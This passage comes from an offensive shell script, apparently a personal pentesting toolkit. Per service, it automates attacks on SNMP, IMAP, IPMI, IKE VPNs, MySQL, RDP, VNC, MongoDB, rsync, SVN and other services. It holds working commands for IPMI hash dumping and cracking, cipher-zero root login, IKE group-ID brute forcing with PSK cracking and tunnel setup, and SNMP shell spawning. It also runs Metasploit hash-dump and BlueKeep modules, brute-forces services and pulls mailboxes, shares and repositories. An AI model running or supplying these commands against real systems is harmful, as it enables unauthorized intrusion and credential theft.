            echo ""; read -r com_string\?"[+] INPUT A VALID COMMUNITY STRING (CTRL-C IF NONE): "

            echo -e "\n[+] DUMPING PARSED MIB TREE IN \"$2_SNMPCHECK.txt\""
            snmp-check -v $snmp_ver -p $3 -d -c $com_string $2 > $2_SNMPCHECK.txt
            cat $2_SNMPCHECK.txt

            echo -e "\n[+] DUMPING FULL MIB DATA IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v$snmp_ver -c $com_string $2:$3 NET-SNMP-EXTEND-MIB::nsExtendOutputFull | tee > $2_SNMPWALK.txt

            echo -e "\n[+] GREPPING FOR PRIVATE STRINGS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\n[+] GREPPING USERNAMES/PASSWORDS DATA\n"
            cat $2_SNMPWALK.txt | grep -i "login\|fail"

            echo -e "\n[+] GREEPING IPv6 ADDRESSES\n"
            cat $2_SNMPWALK.txt | grep -i 'ipv6\.' | cut -d '"' -f2 | sed -E 's/(.{2}):(.{2})/\1\2/g'

            echo -e "\n[+] GREPPING IPv4 ADDRESSES\n"
            cat $2_SNMPWALK.txt | grep -i 'ipv4\.' | cut -d '"' -f2

            echo -e "\n[+] GREPPING FOR EMAILS\n"
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt

            echo -e "\n[+] TRYING TO SPAWN A NET-SNMP SHELL (WRITE PRIVILEGE)\n"
            /home/kali/TOOLS/snmp-shell/venv/bin/python3 /home/damuna/tools/snmp-shell/shell.py -v $snmp_ver -c $com_string $2:$3

            echo -e "\n[+] ATTEMPTING CISCO SNMP TFTP\n"
            msfconsole -q -x "use auxiliary/scanner/snmp/cisco_config_tftp; set COMMUNITY $com_string; set RHOSTS $2; set RPORT $3; set VERSION $snmp_ver; run"

            echo -e "\n[+] BRUTEFORCING OIDS VIA BRAA\n"
            braa $com_string@$2:.1.3.6.*
        fi
    fi

    if [[ $1 == "imap" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="imap-* and not brute" -p$3 $2

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert $2 $3 $1

        echo -e "\n[+] MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r cred\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)

            echo -e "\n[+] LISTING MAILBOXES\n"
            curl -u "$usr:$psw" imap://$2:$3 -X 'LIST "" "*"'

            while true; do read -r mailbox\?"[+] INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$2:$3/$mailbox && read -r index\?"[+] INPUT MAIL UID TO read -r (BLANK TO SKIP): " && curl -u "$usr:$psw" "imap://$2:$3/$mailbox;UID=$index"; done
        fi

    fi

    if [[ $1 == "ipmi" ]]; then
        echo -e "\n[+] ENUMERATING VERSION\n"
        sudo nmap -n -Pn -v -sUV --script "ipmi-* or supermicro-ipmi-conf" -p$3 $2
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\n[+] CHECKING ANONYMOUS USER LISTING\n"
        ipmitool -I lanplus -H $2 -U '' -P '' user list

        echo -e "\n[+] CHECKING HASH DUMP\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $2; set RPORT $3; set OUTPUT_JOHN_FILE /tmp/$2_IPMI.john; exploit; exit"
        if [[ -f /tmp/$2_IPMI.hashcat ]]; then
            echo -e "\n[+] FOUND HASH, CRACKING WITH ROCKYOU\n"
            john --wordlist=/usr/share/wordlists/rockyou.txt --fork=15 --session=ipmi --rules=Jumbo --format=rakp /tmp/$2_IPMI.john
        fi

        echo -e "\n[+] CHECKING CIPHER ZERO\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"[+] IS CIPHER ZERO SUCCESSFUL? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            echo -e "\n[+] AUTHENTICATING AS ROOT AND DUMPING USERS\n"
            ipmitool -I lanplus -C 0 -H $2 -U root -P root user list
        fi
    fi

    if [[ $1 == "netbios" ]]; then
        echo -e "\n[+] GETTING DOMAINS, HOSTS AND MACS\n"
        nmblookup -A $2
        nbtscan $2/30
        sudo nmap -sCV --script nbstat -p$3 -n -Pn $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/netbios/nbname; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "afp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="afp-* and not dos and not brute" -p$3 $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/afp/afp_server_info; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "irc" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="irc-* and not brute" -p$3 $2

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert $2 $3 $1

        echo -e "\n[+] ATTEMPTING ANONYMOUS CONNECTION TO THE IRC AS \"test_user\"\n"
        irssi -c $2 --port $3

        srvbrute irc $2 $3
    fi

    if [[ $1 == "ike" ]]; then
        sudo ipsec stop 2>/dev/null
        echo -e "\n[+] ATTEMPTING TO RETRIEVE VERSION AND HANDSHAKE\n"
        sudo ike-scan -M -A $2 -d $3 > /tmp/ike_$2.txt
        cat /tmp/ike_$2.txt
        group_id=$(cat /tmp/ike_$2.txt | grep Value= | awk '{print $2}' | tr -d ')' | cut -d '=' -f2)

        if [[ -z $group_id ]]; then
            echo -e "\n[+] HANDSHAKE NOT RETURNED, SENDING FAKE ID TO CHECK BRUTEFORCING"
            sudo ike-scan -P -M -A -n fakeid $2 -d $3 > /tmp/brute_chk_$2.txt
            flg=$(cat /tmp/brute_chk_$2.txt | grep -i "ike psk parameters" -A1 --color=never)
            if [[ -z $flg ]]; then
                echo -e "\n[+] RANDOM HASH WAS NOT RETURNED, BRUTEFORCING ID...\n"
                while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line $2 -d $3) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /home/damuna/wordlists/vpnIDs.txt > /tmp/$2_fnd_id.txt
                group_id=$(cat /tmp/$2_fnd_id.txt | awk '{print $3}')
            else
                echo -e "\n[+] BRUTEFORCING NOT POSSIBLE, FINGERPRINTING VENDOR...\n"
                ike-scan -M --showbackoff $2 -d $3 | grep -i "implementation guess" --color=never
            fi
        fi
        if [[ ! -z $group_id ]]; then
            echo -e "\n[+] GOT ID \"$group_id\", CRACKING HASH USING ROCKYOU..."
            sudo ike-scan -M -A -n $group_id --pskcrack=/tmp/$2_ike_hash.txt $2 -d $3 >/dev/null
            psk-crack -d /usr/share/wordlists/rockyou.txt /tmp/$2_ike_hash.txt > /tmp/$2_psk_chk
            res=$(cat /tmp/$2_psk_chk | grep -i matches)
            if [[ ! -z $res ]]; then
                psw=$(cat /tmp/$2_psk_chk | grep -i "matches" | awk '{print $2}' | tr -d '"')
                echo -e "  - Found Password: \"$psw\"\n"
                echo -e "[+] ATTEMPTING STRONG-SWAN CONNECTION\n"
                chnic

                salt=$(openssl rand -hex 4)
                echo "$ip $2 : PSK \"$psw\"" | sudo tee -a /etc/ipsec.secrets >/dev/null
                echo "conn $salt\n\tauthby=secret\n\tauto=add\n\tkeyexchange=ikev1\n\tike=3des-sha1-modp1024\n\tleft=$ip\n\tright=$2\n\ttype=transport\n\tesp=3des-sha1\n\trightprotoport=tcp" | sudo tee -a /etc/ipsec.conf >/dev/null

                sudo ipsec stop
                sudo ipsec start
                sleep 3
                sudo ipsec up $salt
            else
                echo -e "\n[-] UNABLE TO CRACK PSK HASH, TRY DIFFERENT WORDLIST\n"
                exit 1
            fi
        fi
    fi

    if [[ $1 == "rtsp" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "rtsp-* and not brute" -p$3 $2
    fi


    if [[ $1 == "rsync" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script "rsync-* and not brute" -p$3 $2

        echo -e "\n[+] ATTEMPTING NULL SHARES LISTING\n"
        rsync -av --list-only rsync://$2:$3

        echo "" && while true; do read -r shr\?"[+] INPUT SHARE NAME TO DOWNLOAD (CTRL-C IF NONE): " && echo -e "\n[+] DOWNLOADING \"$shr\" IN \"$2_$shr\"\n" && rsync -av rsync://$2:$3/$shr ./$2_$shr; done
    fi

    if [[ $1 == "dhcp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sCV --script="broadcast-dhcp* or dhcp-*" -p$3 $2
    fi

    if [[ $1 == "tns" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "oracle-tns-version" -p$3 $2

        echo -e "\n[+] ODAT TESTING\n"
        odat all -s $2 -p $3

        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
            read -r db\?"[+] INPUT DATABASE NAME: "

            echo -e "\n[+] ATTEMPTING SYSDBA AUTHENTICATION\n"  
            sqlplus "$usr/$psw@$2/$db" as sysdba
        fi
    fi

    if [[ $1 == "ajp" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script="ajp-* and not brute" -p$3 $2
    fi

    if [[ $1 == "memcache" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script=memcached-info -p$3 $2

        echo -e "\n[+] MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_amp; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_udp_version; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\n[+] FETCHING ITEMS\n"
        memcdump --servers=$2

        while true; do read -r item\?"[+] INPUT ITEM NAME TO READ: " && memccat --servers=$2 $item; done
    fi

    if [[ $1 == "redis" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script "redis-* and not brute" -p$3 $2

        srvbrute redis $2 $3
    fi


    if [[ $1 == "vnc" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p$3 $2

        srvbrute vnc $2 $3

        read -r psw\?"[+] INPUT VALID PASSWORD IF FOUND: "
        if [[ ! -z $psw ]]; then
            echo -e "\n[+] ATTEMPTING CONNECTION\n"
            echo $psw > /tmp/$2_VNCPASS.txt
            vncviewer -passwd /tmp/$2_VNCPASS.txt $2::$3
        fi 
    fi

    if [[ $1 == "squid" ]]; then
        echo -e "\n[+] CHECKING PIVOTING AND SCANNING TCP PORTS\n"
        /home/kali/TOOLS/spose/venv/bin/python3 /home/kali/TOOLS/spose/spose.py --proxy "http://$2:$3" --target "$2" --allports
    fi

    if [[ $1 == "mysql" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="mysql-* and not brute" -p$3 $2

        echo -e "\n[+] CERTIFICATE DATA\n"
        sslcert $2 $3 $1

        echo -e "\n[+] MSF UNAUTHENTICATED HASH DUMP CHECK\n"
        msfconsole -q -x "use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RPORT $3; set RHOSTS $2; exploit; exit"

        srvbrute mysql $2 $3

        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\n[+] ATTEMPTING HASH DUMP\n"
            msfconsole -q -x "use auxiliary/scanner/mysql/mysql_hashdump; set USERNAME $usr; SET PASSWORD $psw; set RPORT $3; set RHOSTS $2; exploit; exit"

            echo -e "\n[+] ATTEMPTING LOGIN WITH \"$creds\"\n"
            mysql --skip-ssl --host=$2 --port=$3 --user="$usr" --password="$psw"
        fi
    fi

    if [[ $1 == "amqp" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="amqp-info" -p$3 $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/amqp/amqp_version; set RPORT $3; set RHOSTS $2; exploit; exit"
    
        echo -e "\n[+] CHECKING GUEST AUTHENTICATION\n"
        curl -kIL http://$2:$3/api/connections -u guest:guest

        read -r cred\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            echo -e "\n[+] FETCHING API CONNECTIONS\n"
            curl -kIL http://$2:$3/api/connections -u "$cred"
        fi

        read -r amqp_hash\?"[+] INPUT B64 AMQP HASH IF FOUND: "
        if [[ ! -z $amqp_hash ]]; then
            echo $amqp_hash | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > /tmp/$2_AMQP.txt
            /home/damuna/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -w 4 -m 1420 --hex-salt /tmp/$2_AMQP.txt /usr/share/wordlists/rockyou.txt
        fi
    fi

    if [[ $1 == "mongodb" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -pn -v -sV --script="mongodb-* and not brute" -p$3 $2

        srvbrute mongodb $2 $3

        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\n[+] ATTEMPTING LOGIN\n"
            mongo -u $usr -p $psw --port $3 $2
        fi
    fi

    if [[ $1 == "glusterfs" ]]; then
        echo -e "\n[+] LISTING AVAILABLE VOLUMES\n"
        sudo gluster --remote-host=$2:$3 volume list

        read -r glust\?"[+] INPUT VOLUME TO MOUNT: "
        echo -e "\n[+] MOUNTING VOLUME \"$glust\"\n"
        sudo mkdir /mnt/$glust && sudo mount -t glusterfs $2:$3/$glust /mnt/$glust && cd /mnt/$glust
    fi

    if [[ $1 == "rdp" ]]; then
        echo -e "\n[+] ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="rdp-* and not brute" -p$3 $2

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $3; set RHOSTS $2; exploit; exit"

        srvbrute rdp $2 $3
        read -r creds\?"[+] INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r shr\?"[+] ATTEMPTING LOGIN, INPUT KALI PATH TO SHARE (BLANK IF NONE): "
            if [[ ! -z $shr ]]; then
                xfreerdp3 /u:$usr /p:"$psw" /v:$2 /port:$3 /dynamic-resolution +clipboard /drive:linux,$shr
            else
                xfreerdp3 /u:$usr /p:"$psw" /v:$2 /port:$3 /dynamic-resolution +clipboard
            fi
        fi
    fi

    if [[ $1 == "rexec" ]]; then
        srvbrute rexec $2 $3
    fi

    if [[ $1 == "rlogin" ]]; then
        srvbrute rlogin $2 $3
    fi

    if [[ $1 == "rsh" ]]; then
        srvbrute rsh $2 $3
    fi

    if [[ $1 == "rtsp" ]]; then
        srvbrute rtsp $2 $3
    fi

    if [[ $1 == "svn" ]]; then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="http-svn-* or svn-brute" -p$3 $2

        echo -e "\n[+] REPOSITORY LISTINGS\n"
        svn ls svn://$2:$3

        echo -e "\n[+] FETCHING COMMIT HISTORY\n"
        svn log svn://$2:$3

        echo -e "\n[+] DOWNLOADING REPOSITORY\n"
        mkdir /tmp/$2_SVN && cd /tmp/$2_SVN && svn checkout svn://$2:$3

        echo -e "\n[+] TO CHANGE REVISION -> \"svn up -r {NUMBER}\"\n"
    fi
}
